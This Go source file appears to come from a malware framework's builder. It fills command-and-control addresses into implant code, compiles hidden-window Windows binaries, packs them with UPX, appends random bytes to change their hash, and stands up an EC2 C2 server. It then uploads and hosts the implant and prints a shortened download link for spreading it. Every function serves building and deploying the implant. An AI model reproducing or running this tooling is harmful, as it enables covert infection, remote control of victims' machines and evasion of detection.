package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

/**
Replace constant placeholders _X_ in the source files with correct values
*/
func (project *project) preprocess_file(data []byte) []byte {
	sdata := string(data)

	// Replace imports
	sdata = strings.Replace(sdata, "malware/", project.Srcid+"/", -1)

	sdata = strings.Replace(sdata, "_C2_IP_", project.Ip, -1)
	sdata = strings.Replace(sdata, "_C2_PORT_", strconv.Itoa(project.Port), -1)

	modules_create := ""
	modules_import := ""
	for _, module := range project.Modules {
		modules_create += module + ".Create(),\n"
		modules_import += "\"" + project.Srcid + "/implant/modules/" + module + "\"\n"
	}
	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_IMPORT_", modules_import, -1)
	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_", modules_create, -1)

	return []byte(sdata)
}

// Duplicate folder structure
// Pretty much cp -a
// Calls preprocess_file on each file to replace constants
func (project *project) duplicate_folder(path string, f os.FileInfo, err error) error {
	newpath := project.Srcdir + "/" + path
	if f.IsDir() {
		os.MkdirAll(newpath, os.ModePerm)
	} else {
		input, err := ioutil.ReadFile(path)
		if err != nil {
			return err
		}

		data := project.preprocess_file(input)

		err = ioutil.WriteFile(newpath, data, 0644)
		return err
	}

	return nil
}

// Compile program and panic on any errors
func (project *project) compile(program string, outname string, use_goos_arch bool) string {
	outfile := HOME_DIR + project.Name + "/" + outname

	// We only use goos and goarch for implant. C2 is always linux 64bit
	if use_goos_arch {
		var flags string
		if project.GOOS == "windows" {
			flags = "-n -s -w -H windowsgui"
		} else {
			flags = "-n -s -w"
		}
		checkCommand("env", "GOOS="+project.GOOS, "GOARCH="+project.GOARCH,
			"bash", "-c", "go build -o "+outfile+" -ldflags '"+flags+"' "+program)
	} else {
		checkCommand("env", "GOOS=linux", "GOARCH=amd64",
			"bash", "-c", "go build -o "+outfile+" -ldflags '-s -w' "+program)
	}

	// UPX Pack all binaries to make them smaller than 10000000000000000000000 megabytes
	checkCommand("upx", outfile)

	// Return filename
	return outfile
}

// Gen ssh keys + ec2 ip
func (project *project) generate_c2_ip() string {
	log.Println("Bringing up c2 infra...")
	ip := strings.TrimSpace(string(checkCommand("bash", "cmd/c2_up", HOME_DIR+project.Name)))

	log.Println("C2 up on ", ip, " Waiting for c2 to boot...")

	for true {
		time.Sleep(5 * time.Second)

		log.Println("Checking to see if c2 booted")

		err := exec.Command("ssh", "-o", "StrictHostKeyChecking no", "-i", HOME_DIR+project.Name+"/id_c2", "-t", "ec2-user@"+ip, "/bin/true").Run()
		if err == nil {
			break
		}
	}

	log.Println("C2 booted")

	return ip
}

/**
Easiest way to upload files in with scp, rather than including unneccesary libraries

3 files we need to upload
C2 -> As this is the c2 server

Also need a way to host implant to be downloaded remotely
This requires a hosting_implant.sh file which will create a daemon process running
a http server hosting the implant

and the actual implant itself
*/
func (project *project) uploadC2(c2 string, implant string, priv_key string) {
	upload_cmd := "scp -i " + priv_key + " -o \"StrictHostKeyChecking no\" %s ec2-user@" + project.Ip + ":~/%s"

	// Upload C2
	log.Print("Uploading c2...")
	checkCommand("bash", "-c", fmt.Sprintf(upload_cmd, c2, "c2"))
	fmt.Println("Done")

	// Upload hosting_implant.sh and execute it
	log.Print("Uploading hosting implant.sh...")
	checkCommand("bash", "-c", fmt.Sprintf(upload_cmd, "cmd/hosting_implant.sh", "hosting_implant.sh"))
	fmt.Println("Done")

	// hosting_implash.sh will also create the directory to upload our implant, so we need to run it
	checkCommand("ssh", "-o", "StrictHostKeyChecking no", "-i", HOME_DIR+project.Name+"/id_c2", "-t", "ec2-user@"+project.Ip, "./hosting_implant.sh")

	log.Print("Uploading implant...")
	checkCommand("bash", "-c", fmt.Sprintf(upload_cmd, implant, "implant/"+project.Name))
	fmt.Println("Done")

	// Uploading certs and keys
	log.Print("Uploading certs...")
	checkCommand("bash", "-c", fmt.Sprintf(upload_cmd, project.Srcdir+"/cert.pem", "cert.pem"))
	checkCommand("bash", "-c", fmt.Sprintf(upload_cmd, project.Srcdir+"/key.pem", "key.pem"))
	fmt.Println("Done")

	// Print the binary location
	project.Download_url = shorten("http://" + project.Ip + ":8080/" + project.Name)
	log.Println("Binary implant: ", project.Download_url)

}

// Generate cert/key
// Generate IP for c2
// Copy source to /tmp dir
// Preprocess %keys%, %options%
// build and copy binaries somewhere
// Upload and run c2 binary
func (project *project) compile_c2_implant() {

	// Create temp dir of formate ~/go/src/waterpistolXXXXXXXXXX
	tmpdir, err := ioutil.TempDir(os.Getenv("GOPATH"), "src/waterpistol")
	id := strings.Split(tmpdir, "src/")[1] // Get the filename
	checkError(err)

	log.Println("Project source dir created", tmpdir)
	defer os.RemoveAll(tmpdir) // Make sure we clear this when done

	project.Srcdir = tmpdir
	project.Srcid = id

	// Genereate ec2
	c2_ip := project.generate_c2_ip()
	if c2_ip == "" {
		panic("Got empty c2 ip, spinup failed")
	}

	project.Ip = c2_ip
	project.Port = rand.Intn(65535) + 1
	for project.Port == 8080 { // 8080 is used for implant hosting
		project.Port = rand.Intn(65535) + 1
	}

	// Copy source for implant and c2
	checkError(filepath.Walk("implant", project.duplicate_folder))
	checkError(filepath.Walk("c2", project.duplicate_folder))
	checkError(filepath.Walk("common", project.duplicate_folder))

	log.Println("Source copied")
	GenCerts(project.Srcdir)
	log.Println("Certs generated")

	implant := project.compile(id+"/implant", "implant", true)
	log.Println("Binary implant: ", implant)

	// Randomise the implant by adding garbage to the end
	checkCommand("bash", "-c", "head /dev/urandom >> "+implant)

	c2 := project.compile(id+"/c2", "c2", false)
	log.Println("Binary c2: ", c2)

	project.uploadC2(c2, implant, HOME_DIR+project.Name+"/id_c2")
}
